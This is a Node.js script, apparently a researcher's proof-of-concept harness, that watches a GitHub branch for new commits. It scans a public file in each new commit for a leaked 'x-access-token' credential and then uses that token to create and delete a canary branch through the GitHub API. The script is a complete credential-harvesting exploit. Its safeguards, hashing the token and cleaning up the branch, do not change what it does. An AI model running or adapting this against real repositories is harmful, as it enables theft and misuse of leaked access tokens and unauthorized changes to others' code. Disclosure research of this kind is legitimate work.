#!/usr/bin/env node

import { createHash } from "node:crypto";
import { execFile } from "node:child_process";
import { promisify } from "node:util";

const execFileAsync = promisify(execFile);

function required(name) {
  const value = process.env[name];
  if (!value) throw new Error(`missing required environment variable: ${name}`);
  return value;
}

const owner = required("CCA_OWNER");
const repo = required("CCA_REPO");
const branch = required("CCA_BRANCH");
const runId = required("CCA_RUN_ID").replace(/[^A-Za-z0-9._-]/g, "-");
const gitRemote =
  process.env.CCA_GIT_REMOTE || `https://github.com/${owner}/${repo}.git`;
const apiBase = process.env.CCA_API_BASE || "https://api.github.com";
const rawBase =
  process.env.CCA_RAW_BASE || "https://raw.githubusercontent.com";
const pollMs = Number(process.env.CCA_POLL_MS || "2000");
const timeoutMs = Number(process.env.CCA_TIMEOUT_MS || "720000");
const targetPath =
  process.env.CCA_TARGET_PATH || "docs/release-notes.md";
const proofRef = `refs/heads/cca-live-proof-${runId}`;

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function readRemoteSha() {
  const { stdout } = await execFileAsync(
    "git",
    ["ls-remote", "--refs", gitRemote, `refs/heads/${branch}`],
    { timeout: 15000, maxBuffer: 1024 * 1024 },
  );
  return stdout.trim().split(/\s+/)[0] || null;
}

async function readPublicFile(commitSha) {
  const encodedPath = targetPath
    .split("/")
    .map((part) => encodeURIComponent(part))
    .join("/");
  const url = `${rawBase}/${encodeURIComponent(owner)}/${encodeURIComponent(repo)}/${commitSha}/${encodedPath}`;
  const response = await fetch(url, {
    headers: { "cache-control": "no-cache" },
    redirect: "error",
  });
  if (!response.ok) return null;
  return response.text();
}

function recoverCredential(text) {
  if (!text) return null;
  const match = text.match(/x-access-token:([^@\s]+)@github\.com/i);
  return match?.[1] || null;
}

async function api(path, options = {}) {
  return fetch(`${apiBase}${path}`, {
    ...options,
    headers: {
      accept: "application/vnd.github+json",
      "x-github-api-version": "2022-11-28",
      ...(options.headers || {}),
    },
  });
}

async function main() {
  const baselineSha = await readRemoteSha();
  if (!baselineSha) throw new Error(`branch does not exist: ${branch}`);

  const startedAt = Date.now();
  let disclosedSha = null;
  let recoveredToken = null;

  while (Date.now() - startedAt < timeoutMs) {
    const candidateSha = await readRemoteSha();
    if (candidateSha && candidateSha !== baselineSha) {
      const remoteContent = await readPublicFile(candidateSha);
      recoveredToken = recoverCredential(remoteContent);
      if (recoveredToken) {
        disclosedSha = candidateSha;
        break;
      }
    }
    await sleep(pollMs);
  }

  if (!recoveredToken || !disclosedSha) {
    console.log(
      JSON.stringify(
        {
          remoteDisclosureObserved: false,
          protectedActionSucceeded: false,
          cleanupSucceeded: false,
          tokenMaterialPrinted: false,
          elapsedMs: Date.now() - startedAt,
        },
        null,
        2,
      ),
    );
    process.exitCode = 3;
    return;
  }

  const fingerprint = createHash("sha256")
    .update(recoveredToken)
    .digest("hex")
    .slice(0, 16);

  const baseRefResponse = await api(
    `/repos/${encodeURIComponent(owner)}/${encodeURIComponent(repo)}/git/ref/heads/${encodeURIComponent(branch)}`,
  );
  const baseRef = baseRefResponse.ok ? await baseRefResponse.json() : null;
  const baseSha = baseRef?.object?.sha;

  let createStatus = null;
  let cleanupStatus = null;
  if (baseSha) {
    const createResponse = await api(
      `/repos/${encodeURIComponent(owner)}/${encodeURIComponent(repo)}/git/refs`,
      {
        method: "POST",
        headers: { authorization: `Bearer ${recoveredToken}` },
        body: JSON.stringify({ ref: proofRef, sha: baseSha }),
      },
    );
    createStatus = createResponse.status;

    if (createResponse.status === 201) {
      const deleteResponse = await api(
        `/repos/${encodeURIComponent(owner)}/${encodeURIComponent(repo)}/git/refs/heads/${encodeURIComponent(proofRef.slice("refs/heads/".length))}`,
        {
          method: "DELETE",
          headers: { authorization: `Bearer ${recoveredToken}` },
        },
      );
      cleanupStatus = deleteResponse.status;
    }
  }

  // Never print the recovered credential or remote file content. The short
  // one-way fingerprint only correlates evidence produced by this process.
  recoveredToken = null;
  const protectedActionSucceeded = createStatus === 201;
  const cleanupSucceeded = cleanupStatus === 204;
  console.log(
    JSON.stringify(
      {
        remoteDisclosureObserved: true,
        disclosedCommit: disclosedSha,
        tokenFingerprintSha256Prefix: fingerprint,
        protectedAction: "create researcher-owned canary ref",
        protectedActionStatus: createStatus,
        protectedActionSucceeded,
        cleanupAction: "delete canary ref using recovered credential",
        cleanupStatus,
        cleanupSucceeded,
        tokenMaterialPrinted: false,
        elapsedMs: Date.now() - startedAt,
        allAssertionsPassed:
          protectedActionSucceeded && cleanupSucceeded,
      },
      null,
      2,
    ),
  );

  process.exitCode = protectedActionSucceeded && cleanupSucceeded ? 0 : 2;
}

main().catch((error) => {
  console.error(
    JSON.stringify({
      harnessError: error instanceof Error ? error.message : String(error),
      tokenMaterialPrinted: false,
    }),
  );
  process.exitCode = 1;
});
